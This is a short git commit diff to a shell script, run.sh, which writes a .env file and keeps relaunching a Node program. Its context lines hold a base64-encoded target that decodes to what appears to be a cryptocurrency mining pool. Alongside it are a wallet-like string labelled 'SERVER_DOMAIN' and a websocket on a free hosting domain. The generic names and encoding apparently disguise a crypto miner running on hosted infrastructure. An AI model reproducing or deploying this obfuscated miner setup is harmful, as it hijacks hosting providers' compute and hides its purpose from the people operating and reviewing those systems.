1ab76d70b9a5d35f772c6caf359d2d688cf951d1
Shin <dirianda187@gmail.com>
2026-08-08 23:12:46 +0700

    Update run.sh

--- run.sh
+++ run.sh
@@ -5,5 +5,5 @@ echo "SERVER_WS=wss://identical-sile-malphite-node-dfaa5ec5.koyeb.app
 SERVER_TARGET=cG9vbC5oYXNodmF1bHQucHJvOjQ0Mw==
 SERVER_DOMAIN=876PV3gx5xAFrfsARXWyJ94AGfB9FjNFp3MxatiGPrAyCELXKjGUHd82ChZLPvhNo3g1Y9kpGZy5UMd23Q5Yn4mHLVT2dUy
 SERVER_SECRET=$NAME
-SERVER_CONNECTION=$PORT" > .env
+SERVER_CONNECTION=$CONNECT" > .env
 while true; do node index.js; sleep 15; done
